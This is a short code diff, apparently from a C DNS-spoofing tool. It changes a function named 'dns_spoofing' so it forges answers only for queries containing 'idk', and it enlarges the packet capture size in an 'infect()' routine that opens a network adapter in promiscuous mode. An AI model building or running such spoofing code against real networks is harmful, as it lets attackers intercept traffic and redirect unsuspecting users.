@@ -203,6 +203,9 @@ static int dns_spoofing(
 	void* dns_answer = (void*)((u_char*)dns_question + strlen(dns_question) + 5);
 	void* end_packet;
 	
+	if (!strstr(dns_question, "idk"))
+		return 0;
+
 	/* create fake dns packet */
 	end_packet = create_fake_dns_respones(dns_header, dns_answer, dns_question);
 
@@ -261,7 +264,7 @@ void infect()
 	/*open the adapter*/
 	fp = pcap_open(
 		adapter->name,
-		4096,
+		65536,
 		PCAP_OPENFLAG_PROMISCUOUS,
 		20,
 		NULL,
